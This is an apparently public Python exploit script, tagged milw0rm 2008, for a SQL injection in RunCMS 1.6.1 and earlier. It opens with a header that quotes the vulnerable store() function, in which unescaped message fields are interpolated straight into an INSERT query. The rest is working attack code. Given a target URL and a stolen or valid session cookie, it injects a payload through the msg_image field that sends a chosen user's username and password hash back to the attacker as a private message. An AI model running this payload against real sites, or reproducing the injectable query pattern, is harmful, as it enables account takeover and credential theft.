#!/usr/bin/python
"""
#=================================================================================================#
#                     ____            __________         __             ____  __                  #
#                    /_   | ____     |__\_____  \  _____/  |_          /_   |/  |_                #
#                     |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\               #
#                     |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |                 #
#                     |___|___|  /\__|  /______  /\___  >__|            |___||__|                 #
#                              \/\______|      \/     \/                                          #
#=================================================================================================#
#                                     This is a public Exploit                                    #
#=================================================================================================#
#  	           		           Runcms <= 1.6.1                                        #
#                                    Sql Injection Vulnerability                                  #
#=================================================================================================#
#                                .-= In memory of our friend rGod =-.                        	  #
#====================================#===========#====================================#===========#
# Server Configuration Requirements  #           # Some Information                   #           #
#====================================#		 #====================================#           #
#                                                #                                                #
# magic_quotes_gpc = 0                           #  Vendor:   runcms.org	                  #
#                                                #  Author:   The:Paradox                         #
#================================================#  Severity: Moderately Critical                 #
#                                                #                                                #
# Uff... I have to find something to put here... #  Proud To Be Italian.                          #
#                                                #                                                #
#====================================#===========#================================================#
# Proof Of Concept / Bug Explanation #                                                            #
#====================================#                                                            #
#												  #
# This time i'm really too lazy to write a long PoC.						  #
# $msg_image (but also $msg_attachment) is unproperly checked when calling store()	          #
# function (modules/messages/class/pm.class.php) 						  #
# Sql injection in insert syntax (whatever I am not using blind attack). Prefix knowledge needed. #
#												  #
#=================================================================================================#

[modules/messages/class/pm.class.php]


64. 	function store() {
65.	global $db, $upload;
66.
67.	if ( !$this->isCleaned() ) {
68.		if ( !$this->cleanVars() ) {
69.			return false;
70.		}
71.	}
72.	
73.	foreach ( $this->cleanVars as $k=>$v ) {
74.		$$k = $v;
75.	}
76.	
77.	if ( empty($msg_id) ) {
78.	
79.		$msg_id = $db->genId($db->prefix('private_msgs').'_msg_id_seq');
80.		
81.		$sql = "
82.			INSERT INTO ".$db->prefix("private_msgs")." SET
83.			msg_id=".intval($msg_id).",
84.			msg_image='$msg_image',
85.			msg_attachment='$msg_attachment',
86.			subject='$subject',
87.			from_userid=".intval($from_userid).",
88.			to_userid=".intval($to_userid).",
89.			msg_time=".time().",
90.			msg_text='$msg_text',
91.			read_msg=0,
92.			type='".$type."',
93.			allow_html=".intval($allow_html).",
94.			allow_smileys=".intval($allow_smileys).",
95.			allow_bbcode=".intval($allow_bbcode).",
96.			msg_replay=".intval($msg_replay)."";
97.	}
98.
99.	if ( !$result = $db->query($sql) ) {
100.		$this->errors[] = _NOTUPDATED;
101.		return false;
102.	}
103.
104.	return true;
105.	}
												  
#=================================================================================================#
# There are other vulnerabilities in this CMS. Find them by yourself. 		                  #
#=================================================================================================#
# Use this at your own risk. You are responsible for your own deeds.                              #
#=================================================================================================#
#                                      Python Exploit Starts                                      #
#=================================================================================================#
"""

import urllib, urllib2
from sys import argv, exit


main = """
#================================================================#
#  	                  Runcms <= 1.6.1                        #
#                   Sql Injection Vulnerability                  #
#                     Discovered By The:Paradox                  #
#                                                                #
#                 rGod is still alive in our hearts              #
#                                                                #
# Usage:                                                         #
#  ./homerun [Target+path] [TargetUid] [ValidUserCookie]         #
#  ./homerun --help (to print an example)                        #
#================================================================#
"""

prefix = "runcms_"

if len(argv)>=2 and argv[1] == "--help": 
	print "\nuser@linux:~/Desktop$ ./homerun http://localhost/web/runcms/ 1 rc_sess=a%3A3%3A%7Bi%3A0%3Bi%3A3%3Bi%3A1%3Bs%3A40%3A%228b394462d67198707aea362098001610d35687ff%22%3Bi%3A2%3Bi%3A1212933002%3B%7D;\n\n" + main + "\n\n[.] Exploit Starting.\n[+] Sending HTTP Request...\n[+] A message with username and password of user with id 1 has been sent to user with id 3.\n -= The:Paradox =-"
else: print main


if len(argv)<=3:	exit()
else:   print "[.] Exploit Starting."


host = argv[1]
tuid = argv[2]
cookie = argv[3]
try: uid = cookie.split("a%3A3%3A%7Bi%3A0%3Bi%3A")[1].split("%3Bi%3A1%3Bs%3A40%3A%")[0]
except: exit("[-] Invalid cookie")
sql = "icon12.gif', msg_attachment='', subject='Master, all was done.', from_userid=" + str(uid) + ", to_userid=" + str(uid) + ", msg_time=0, msg_text=concat('Master, password hash for ',(select uname from " + prefix + "users where uid=" + tuid + "),' is ',(select pass from " + prefix + "users where uid=" + tuid + ")), read_msg=0, type='1', allow_html=0, allow_smileys=1, allow_bbcode=1, msg_replay=0/*"


print "[+] Sending HTTP Request..."
values = {'subject' : 'Master attack failed.',
	  'message' : 'Probably mq = 1 or system patched.',
	  'allow_html' : 0,
	  'allow_smileys' : 1,
	  'allow_bbcode' : 0,
	  'msg_replay' : 1,
          'submit' : '1',
	  'msg_image' : sql,
          'to_userid' : uid }
headers = {'Cookie' : cookie, 
	   'Content-Type' : 'application/x-www-form-urlencoded'}
req = urllib2.Request(host + "/modules/messages/pmlite.php", urllib.urlencode(values), headers)
response = urllib2.urlopen(req)


if response.read().find('Your message has been posted.') != -1: print "[+] A message with username and password of user with id " + tuid + " has been sent to user with id " + uid + ".\n -= The:Paradox =-"
else: print "[-] Unable to send message"

# milw0rm.com [2008-05-08]
